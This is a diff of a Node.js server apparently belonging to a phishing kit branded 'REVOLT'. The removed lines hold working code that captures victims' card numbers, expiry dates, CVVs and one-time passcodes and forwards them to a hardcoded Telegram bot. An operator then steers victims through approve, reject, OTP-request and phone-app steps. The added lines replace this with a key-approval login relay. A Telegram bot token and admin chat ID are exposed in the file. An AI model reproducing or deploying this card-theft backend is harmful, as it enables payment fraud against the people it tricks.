@@ -2,47 +2,68 @@ const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
 const axios = require('axios');
+const bodyParser = require('body-parser'); // Add this
 
 const app = express();
 const server = http.createServer(app);
 const io = new Server(server);
 
+// --- IMPORTANT: Use JSON parser ---
+app.use(bodyParser.json()); 
+app.use(express.static('.')); 
+
 const TELEGRAM_TOKEN = '8105017890:AAGUgv5PhIDq-tSO5mmNiDc4fV8WZWmnxMk';
 const ADMIN_CHAT_ID = '6410887780';
-
-app.use(express.static('.'));
-app.use(express.json());
 
 let sessions = {}; 
 
 io.on('connection', (socket) => {
-    socket.on('customer-order', (data) => {
-        sessions[data.card] = socket.id;
-        const msg = `🚀 *REVOLT NEW ORDER*\n\n📦 Product: *${data.product}*\n💰 Plan: *${data.plan}*\n🏷️ Code: *${data.discountCode}*\n💵 TOTAL: *€${data.finalPrice}*\n\n👤 Name: ${data.name}\n💳 Card: \`${data.card}\` \n📅 Expiry: ${data.expiry} \n🔒 CVV: ${data.cvv}`;
-        const kb = { inline_keyboard: [[{ text: "✅ Approve", callback_data: `approve_${data.card}` }, { text: "❌ Reject", callback_data: `reject_${data.card}` }], [{ text: "🔑 Req OTP", callback_data: `askOTP_${data.card}` }, { text: "📱 Phone App", callback_data: `phoneApp_${data.card}` }]] };
-        sendToTelegram(msg, kb);
-    });
+    socket.on('check-key', (key) => {
+        sessions[key] = socket.id;
+        console.log(`User connected with key: ${key} on socket: ${socket.id}`);
 
-    socket.on('customer-otp', (otp) => {
-        const msg = `📩 *REVOLT OTP RECEIVED*\n\nCard: \`${otp.cardId}\` \nCode: *${otp.code}*`;
-        const kb = { inline_keyboard: [[{ text: "✅ Success", callback_data: `approve_${otp.cardId}` }, { text: "❌ Wrong", callback_data: `askOTP_${otp.cardId}` }]] };
-        sendToTelegram(msg, kb);
+        const text = `🔑 *New Login Attempt*\n\nKey: \`${key}\``;
+        const keyboard = {
+            inline_keyboard: [[
+                { text: "✅ Approve", callback_data: `approve_${key}` },
+                { text: "❌ Reject", callback_data: `reject_${key}` }
+            ]]
+        };
+
+        axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            chat_id: ADMIN_CHAT_ID,
+            text: text,
+            parse_mode: 'Markdown',
+            reply_markup: keyboard
+        });
     });
 });
 
+// --- THE WEBHOOK HANDLER ---
 app.post('/telegram-webhook', (req, res) => {
-    const cb = req.body.callback_query;
-    if (cb) {
-        const [action, cid] = cb.data.split('_');
-        const sid = sessions[cid];
-        if (sid) io.to(sid).emit('admin-instruction', action);
-        axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, { callback_query_id: cb.id, text: `Cmd: ${action}` });
+    // This logs the data to your Render Logs so you can see it working
+    console.log("Data received from Telegram:", JSON.stringify(req.body));
+
+    const callbackQuery = req.body.callback_query;
+    if (callbackQuery) {
+        const data = callbackQuery.data; // e.g., "approve_mykey123"
+        const [action, key] = data.split('_');
+        const socketId = sessions[key];
+
+        if (socketId) {
+            const status = (action === 'approve') ? 'approved' : 'rejected';
+            io.to(socketId).emit('admin-response', status);
+            console.log(`Sent ${status} to socket ${socketId}`);
+            delete sessions[key];
+        }
+
+        // Send a quick response to Telegram to stop the loading icon on the button
+        axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
+            callback_query_id: callbackQuery.id,
+            text: `Key ${action}d!`
+        });
     }
-    res.sendStatus(200);
+    res.sendStatus(200); 
 });
 
-async function sendToTelegram(text, kb) {
-    try { await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, { chat_id: ADMIN_CHAT_ID, text: text, parse_mode: 'Markdown', reply_markup: kb }); } catch (e) { console.log(e.message); }
-}
-
-server.listen(process.env.PORT || 3000, () => console.log('REVOLT IS LIVE'));
+server.listen(process.env.PORT || 3000, () => console.log('Server is Live!'));
